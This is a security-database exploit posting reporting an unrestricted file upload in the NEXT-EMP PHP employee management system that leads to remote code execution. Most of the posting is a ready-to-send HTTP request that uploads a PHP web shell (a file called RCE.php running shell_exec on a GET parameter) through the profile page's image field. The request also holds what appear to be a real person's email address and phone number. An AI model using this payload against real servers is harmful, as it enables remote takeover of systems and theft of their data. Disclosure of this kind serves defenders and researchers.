---
title: NEXT-EMP v1.0-Copyright © 2024. All rights reserved. File Upload-FU and Remote Code Execution-RCE
url: https://cxsecurity.com/issue/WLB-2025010032
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-30
fetch_date: 2025-10-06T20:04:42.014602
---

# NEXT-EMP v1.0-Copyright © 2024. All rights reserved. File Upload-FU and Remote Code Execution-RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NEXT-EMP v1.0-Copyright © 2024. All rights reserved. File Upload-FU and Remote Code Execution-RCE** **2025.01.29**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: NEXT-EMP v1.0-Copyright © 2024. All rights reserved.
### File Upload-FU and Remote Code Execution-RCE Vulnerabilities
# Author: nu11secur1ty
# Date: 01/29/2025
# Vendor: https://www.mayurik.com/
# Software: https://www.mayurik.com/source-code/P8337/complete-employee-management-system-project-in-php-free-download
# Reference: https://portswigger.net/web-security/file-upload | https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
## Description:
The website\_image parameter in profile app is vulnerable for File Upload and then Remote Code Execution without any execution permission sanitizing.
The attacker can upload absolutely DANGEROUS files on that server and he can destroy it with one click!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
- RCE Exploit:
```RCE
POST /pwnedhost/\_hr\_soft/admin/profile.php HTTP/1.1
Host: 192.168.100.45
Cookie: PHPSESSID=slraqmcub88jc9mdbc968fop7l
Content-Length: 1325
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://192.168.100.45
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHzTVdFgDMQYGBepP
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.100.45/pwnedhost/\_hr\_soft/admin/profile.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="old\_website\_image"
stupid.png
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="website\_image"; filename="RCE.php"
Content-Type: application/octet-stream
<?php echo shell\_exec($\_GET["cmd"]); ?>
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="fname"
Mayuri
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="lname"
K
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="email"
mayuri.infospace@gmail.com
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="gender"
Male
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="contact"
9529230459
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="username"
mayurik
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="address"
India
------WebKitFormBoundaryHzTVdFgDMQYGBepP
Content-Disposition: form-data; name="update"
------WebKitFormBoundaryHzTVdFgDMQYGBepP--
```
# Reproduce:
[href](https://www.patreon.com/posts/nextemployee-1-0-121020861)
[more](https://www.nu11secur1ty.com/2025/01/nextemployee-10-rce.html)
## Time spent:
00:37:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010032)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top